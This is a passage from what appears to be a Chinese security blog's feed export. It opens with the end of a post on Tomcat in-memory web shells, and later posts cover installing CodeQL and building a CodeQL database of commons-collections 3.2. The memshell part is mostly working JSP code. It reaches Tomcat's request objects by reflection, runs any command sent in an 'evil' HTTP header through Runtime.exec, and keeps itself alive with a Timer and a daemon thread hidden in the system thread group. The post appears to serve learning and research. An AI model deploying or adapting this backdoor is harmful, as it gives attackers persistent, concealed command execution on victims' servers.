     ArrayList processors;</span><br><span class="line">                        Object target = getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span>(target <span class="keyword">instanceof</span> Runnable)&#123;</span><br><span class="line">                            <span class="keyword">try</span>&#123;</span><br><span class="line">                                processors=(ArrayList)getField(getField(getField(getField(target,<span class="string">&quot;this$0&quot;</span>),<span class="string">&quot;handler&quot;</span>),<span class="string">&quot;global&quot;</span>),<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">for</span>(Object processor:processors)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(processor!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                                    Object req = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                    String temp=(String) req.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>,String.class).invoke(req,<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">                                    <span class="keyword">if</span>(temp!=<span class="keyword">null</span>&amp;&amp;!temp.isEmpty())&#123;</span><br><span class="line">                                        cmd=temp;</span><br><span class="line">                                        <span class="keyword">return</span> cmd;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; objectClass = object.getClass();</span><br><span class="line">        Field field=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (objectClass!=Object.class)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field=objectClass.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                objectClass=objectClass.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(field==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    java.util.Timer ececute=<span class="keyword">new</span> java.util.Timer();</span><br><span class="line">    ececute.schedule(<span class="keyword">new</span> java.util.TimerTask() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            String cmd=getHeader();</span><br><span class="line">            <span class="keyword">if</span>(!cmd.equals(<span class="string">&quot;wrong!&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为什么这里不采用request来执行命令呢</p>
<p>在前面的分析中介绍过，Acceptor的作用是控制与tomcat建立连接的数量，但Acceptor仅仅负责建立连接。socket内容的读写是通过Poller来实现的。</p>
<p>为什么可以通过这样的方式获取到request对象,我觉得牵扯到了tomcat架构的问题,我觉得目前只需要对当前链条做一个复现,大概理解这些涉及到的类都是干嘛的就行</p>
<p>Poller线程-&gt;target(Poller)-&gt;this$0–&gt;handler—&gt;global(RuquestGroupInfo)—&gt;processors—&gt;RequestInfo—&gt;req(Request)</p>
<p>在jsp中定义方法的时候,要使用<code>&lt;%! %&gt;</code>,它能将包裹的内容直接放到映射的servlet中去</p>
<h4 id="不死线程内存马"><a href="#不死线程内存马" class="headerlink" title="不死线程内存马"></a>不死线程内存马</h4><p>Timer型内存马可以归类为不死线程内存马,它的本质就是创建了一个定时执行的Timer线程</p>
<p>所以还可以通过将这个定时接收命令的代码设置为一个不会被GC的守护线程,所有用户线程结束,守护线程才会结束</p>
<p>同时将恶意线程放进<code>system</code>线程组中隐藏</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getHeader</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String cmd=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span><br><span class="line">            Thread[] threads = (Thread[]) getField(threadGroup, <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(Thread thread: threads)&#123;</span><br><span class="line">                <span class="keyword">if</span>(thread!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    String threadName=thread.getName();</span><br><span class="line">                    <span class="keyword">if</span>(threadName.contains(<span class="string">&quot;Poller&quot;</span>) &amp;&amp; threadName.contains(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line">                        ArrayList processors;</span><br><span class="line">                        Object target = getField(thread, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span>(target <span class="keyword">instanceof</span> Runnable)&#123;</span><br><span class="line">                            <span class="keyword">try</span>&#123;</span><br><span class="line">                                processors=(ArrayList)getField(getField(getField(getField(target,<span class="string">&quot;this$0&quot;</span>),<span class="string">&quot;handler&quot;</span>),<span class="string">&quot;global&quot;</span>),<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">for</span>(Object processor:processors)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(processor!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                                    Object req = getField(processor, <span class="string">&quot;req&quot;</span>);</span><br><span class="line">                                    String temp=(String) req.getClass().getMethod(<span class="string">&quot;getHeader&quot;</span>,String.class).invoke(req,<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">                                    <span class="keyword">if</span>(temp!=<span class="keyword">null</span>&amp;&amp;!temp.isEmpty())&#123;</span><br><span class="line">                                        cmd=temp;</span><br><span class="line">                                        <span class="keyword">return</span> cmd;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;wrong!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getField</span><span class="params">(Object object, String fieldName)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;?&gt; objectClass = object.getClass();</span><br><span class="line">        Field field=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (objectClass!=Object.class)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                field=objectClass.getDeclaredField(fieldName);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                objectClass=objectClass.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(field==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchFieldException(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> field.get(object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*获取system线程组*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ThreadGroup <span class="title">getSystemThreadGroup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        ThreadGroup group=Thread.currentThread().getThreadGroup();</span><br><span class="line">        <span class="keyword">while</span>(!group.getName().equals(<span class="string">&quot;system&quot;</span>))&#123;</span><br><span class="line">            group=group.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> group;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    java.util.Timer ececute=<span class="keyword">new</span> java.util.Timer();</span><br><span class="line">    ececute.schedule(<span class="keyword">new</span> java.util.TimerTask() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            String cmd=getHeader();</span><br><span class="line">            <span class="keyword">if</span>(!cmd.equals(<span class="string">&quot;wrong!&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新建线程,加入到system线程组中</span></span><br><span class="line">    Thread thread=<span class="keyword">new</span> Thread(getSystemThreadGroup(), <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                String cmd=getHeader();</span><br><span class="line">                <span class="keyword">if</span>(!cmd.equals(<span class="string">&quot;wrong!&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="string">&quot;no GC me&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    thread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    thread.start();</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考连接</p>
<p><a href="https://www.cnblogs.com/nongchaoer/p/15561948.html">https://www.cnblogs.com/nongchaoer/p/15561948.html</a></p>
<p><a href="https://github.com/4ra1n/JavaSecInterview/tree/master/memshell">https://github.com/4ra1n/JavaSecInterview/tree/master/memshell</a></p>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>memshell</tag>
      </tags>
  </entry>
  <entry>
    <title>codeql安装</title>
    <url>/2022/05/06/codeql%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>本文章为多次尝试之后,自己成功安装并运行成功codeql的记录,没啥技术含量…<span id="more"></span></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>首先安装最新版的vsCode</p>
<h4 id="安装扩展"><a href="#安装扩展" class="headerlink" title="安装扩展"></a>安装扩展</h4><p>在其中搜索并安装CodeQl拓展</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506121927675.png" alt="image-20220506121927675"></p>
<h4 id="下载codeql引擎"><a href="#下载codeql引擎" class="headerlink" title="下载codeql引擎"></a>下载codeql引擎</h4><p>接着下载codeql引擎,选择对应版本即可</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506121845766.png" alt="image-20220506121845766" style="zoom:80%;" />

<p>点击小齿轮,Extension Settings 打开拓展设置</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506121953523.png" alt="image-20220506121953523"></p>
<p>把刚才下载并解压的ql引擎文件中的<code>codeql.exe</code>的路径填写上去</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506122124707.png" alt="image-20220506122124707"></p>
<p>同时把codeql.exe的路径配置到环境变量<code>path</code>中去,这一步是为了后面使用命令行构建数据库做准备</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506122629448.png" alt="image-20220506122629448"></p>
<h4 id="设置workspace"><a href="#设置workspace" class="headerlink" title="设置workspace"></a>设置workspace</h4><p>接下来设置workspace</p>
<p>直接去clone这个项目<a href="https://github.com/github/vscode-codeql-starter,%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E6%9C%89%E5%A4%A7%E4%BD%AC%E8%AE%BE%E7%BD%AE%E5%A5%BD%E7%9A%84workspace,%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8B%BF%E6%9D%A5%E7%94%A8">https://github.com/github/vscode-codeql-starter,这个项目中有大佬设置好的workspace,可以直接拿来用</a></p>
<p>在clone的时候因为其包含子项目,不能直接git clone,需要加一个<code>--recursive</code>参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/github/vscode-codeql-starter.git</span><br></pre></td></tr></table></figure>

<p>如果https的报ssl错误,记得换成ssh的连接clone</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive git@github.com:github/vscode-codeql-starter.git</span><br></pre></td></tr></table></figure>

<h3 id="构建数据库"><a href="#构建数据库" class="headerlink" title="构建数据库"></a>构建数据库</h3><p>现在需要下载的东西都下载完成了,接下来是很重要的一步,也就是构建数据库</p>
<p>这里以java为例,建议第一次先新建一个maven项目,随便写点东西进去</p>
<p>给一个简单的maven项目建立数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\jndi --language=&quot;java&quot; --command=&quot;mvn clean install --file pom.xml&quot; --source-root=E:\java\jndi --overwrite</span><br></pre></td></tr></table></figure>

<p>第一部分是给建立数据库指定的文件夹,</p>
<p><code>--source-root</code>顾名思义就是源码文件夹</p>
<p><code>--command</code>则是指定使用maven来帮助进行编译打包,这里是最容易出问题的地方,各种依赖呀啥的都需要编译打包之后才能添加进数据库里面进行查询</p>
<p>也就是说codeql需要mvn帮助打包才能构建数据库</p>
<p><code>--overwrite</code>参数表示可以覆盖旧的数据库</p>
<p>对于java来说,如果在构建数据库的过程中出错了,那么一般都是因为mvn打包出了问题,可以单独在idea终端中尝试<code>mvn clean install --file pom.xml</code>根据报错信息来推断哪里出了问题</p>
<h3 id="执行查询语句"><a href="#执行查询语句" class="headerlink" title="执行查询语句"></a>执行查询语句</h3><p>首先打开vscode,通过<code>file-&gt; Open Workspace from file</code>打开刚才clone好的那个workspace项目中的<code>.code-workspace</code>文件</p>
<p>这样就成功引入了workspace</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124421164.png" alt="image-20220506124421164"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124308766.png" alt="image-20220506124308766"></p>
<p>接着在vsCode的侧边栏</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124042825.png" alt="image-20220506124042825"></p>
<p>点击这个QL,进去之后,就可以添加数据库了</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124111095.png" alt="image-20220506124111095" style="zoom:67%;" />

<p>通过目录引入刚才新建好的数据库</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124535532.png" alt="image-20220506124535532"></p>
<p>接着在custom这个目录下新建test.ql文件,编写ql语句,进行第一次查询</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124610207.png" alt="image-20220506124610207" style="zoom:80%;" />

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124647783.png" alt="image-20220506124647783"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> <span class="type">int</span> x, <span class="type">int</span> y</span><br><span class="line"><span class="keyword">where</span> x <span class="operator">=</span> <span class="number">3</span> <span class="keyword">and</span> y <span class="keyword">in</span> [<span class="number">0</span> .. <span class="number">2</span>]</span><br><span class="line"><span class="keyword">select</span> x, y, x <span class="operator">*</span> y <span class="keyword">as</span> product, &quot;product: &quot; <span class="operator">+</span> product</span><br><span class="line"><span class="keyword">as</span> res <span class="keyword">order</span> <span class="keyword">by</span>  res <span class="keyword">desc</span></span><br></pre></td></tr></table></figure>

<p>右键在当前数据库Run query</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124801886.png" alt="image-20220506124801886"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220506124822269.png" alt="image-20220506124822269"></p>
<p>成功执行了</p>
]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>构建Connons-Colletions3.2_x 的Codeql数据库</title>
    <url>/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="构建Connons-Colletions3-2-x-的Codeql数据库"><a href="#构建Connons-Colletions3-2-x-的Codeql数据库" class="headerlink" title="构建Connons-Colletions3.2_x 的Codeql数据库"></a>构建Connons-Colletions3.2_x 的Codeql数据库</h1><p>安装配置好codeql也有一段时间了,期间看了一些简单的语法和例子,最近学校期末了,老师安排的屁事有点多,导致好几天没学习了</p>
<p>之前就听说codeql分析利用链特别厉害,java中反序列化利用链最出名的就是cc链了吧(个人观点),我学习codeql的目标就是自己能仿照着编写cc链的ql语句</p>
<p>但是codeql现在的java模块有个问题,就是生成数据库的时候,只能生成一个项目的代码数据库,它的依赖只有在代码中引入并加载的类才会被添加到数据库当中去</p>
<p>对此,我去github提问了一下(这也是我第一次在github提问…)</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/4e3482e87f6c59f7fb66e9d7f4c6645b.png" alt="image-20220512152353868"></p>
<p>这是维护者大佬做出的回复</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/05cf854bb259eefe20bbb18ed9314c4d.png" alt="image-20220512152328284"></p>
<p>总而言之,就是想分析哪个依赖,就得单独为它创建数据库,我点了大佬的链接进去,下载下来的数据库是cc4的最新版本的数据库,可能是因为master分支放的是cc4吧…..</p>
<p>那没办法只能自己建cc3的库了…..</p>
<p>于是参照这篇文章<a href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
<p>这篇文章中提到两种数据库获取方式,第一种就是去lgtm直接下载,第二种是自己clone一份代码下来,然后上传到github仓库并配置lgtm让lgtm扫描后再去下载数据库,但是转念一想,既然它能生成,那我自己用clone的代码来搞不也一样吗</p>
<p>于是开始了痛苦之路</p>
<h2 id="建立CC3数据库"><a href="#建立CC3数据库" class="headerlink" title="建立CC3数据库"></a>建立CC3数据库</h2><p>接下来的东西需要对git的基础命令和原理有一定的了解,可以先去b站看<a href="https://www.bilibili.com/video/BV1FE411P7B3?spm_id_from=333.337.search-card.all.click">狂神的git视频</a>学习一下</p>
<p>git clone并切换源码到指定分支</p>
<p>先打开git bash  然后 clone cc项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/commons-collections.git</span><br></pre></td></tr></table></figure>

<p>接下来cd进入项目目录,切换分支为cc3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout COLLECTIONS_3_2_X</span><br></pre></td></tr></table></figure>

<blockquote>
<p>错误方式</p>
</blockquote>
<p>一看里面有pom.xml文件,大喜过望,开始mvn clean install生成数据库,然后一个大大的fatal甩在脸上……</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>

<p>之前的文章中说过,生成数据库出错了不能着急,要一步步排查,首先codeql命令行是不会给出具体的错误提示的,只会说是mvn这条命令报错了</p>
<p>总的来说有两个错误,我们一一来分析解决</p>
<h4 id="错误一"><a href="#错误一" class="headerlink" title="错误一"></a>错误一</h4><p>然后我们打开idea,在idea命令行中使用mvn clean install –file pom.xml进行编译,出现了这样返回类型不一致的报错,打开报错的类的源码,发现这几个名字牛逼轰轰的Map类中remove方法返回的是Object类型的,这和其间接继承的Map接口中定义的boolean截然不同,怪不得报错</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8d6d61815dec7b21aa543fcb46fa45c0.png" alt="image-20220512153751430"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bc39db9b1d776707a9b8c386825b546c.png" alt="image-20220512154328441"></p>
<h6 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h6><p>当我在idea的Project Structure中把jdk版本从平时用的1.8下调到1.7的时候,这个报错就消失了,欧耶!!!</p>
<h4 id="错误二"><a href="#错误二" class="headerlink" title="错误二"></a>错误二</h4><p>但是与此同时,还有个问题也发生了,使用idea右侧边连的maven 依次 clean和install的时候,报了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">错误: 不再支持目标选项 1.2。请使用 7 或更高版本。</span><br></pre></td></tr></table></figure>

<p>的错误</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5c58d7e1dc433f315606b54789280a6c.png" alt="image-20220512154036543"></p>
<p>去百度之后发现大概意思就是说,jdk版本太低了,咋了咋了的</p>
<p>在cc3的pom.xml最下面发现它自己指定了编译的jdk版本是1.2</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b7c35e183f5f612933fc48656b934440.png" alt="image-20220512154601318"></p>
<h6 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h6><p>为了一次性到位,首先把pom.xml中的版本改成1.7</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/fdf861fb56261b5ff30edf2d38ee09a3.png" alt="image-20220512154736745"></p>
<p>接着在最下面的plugins中添加这两个</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220512154819016.png" alt="image-20220512154819016" style="zoom:80%;" />

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">testFailureIgnore</span>&gt;</span>true<span class="tag">&lt;/<span class="name">testFailureIgnore</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>并且,打开本地maven的setting.xml文件</p>
<p>找到对应的位置,就是<code>&lt;profiles&gt;</code>标签下面就行,添加如下语句,指定默认jdk版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.7<span class="tag">&lt;/<span class="name">id</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是还是报错了,最后去环境变量里面把JAVA_HOME改成1.7的就行了(到这里终于目标为啥配环境变量的时候非得搞个叫JAVA_HOME的,而不是直接往path里面添加,改起来是真滴快啊)</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3ec4b8d3b4b6e92bacb55f064798a99f.png" alt="image-20220512155048464"></p>
<h4 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h4><p>最后再次打开命令行输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>

<p>成功构建cc3的数据库</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/25f2a1ac18122cb378b43056fe34a42f.png" alt="image-20220512155241642"></p>
]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>java</tag>
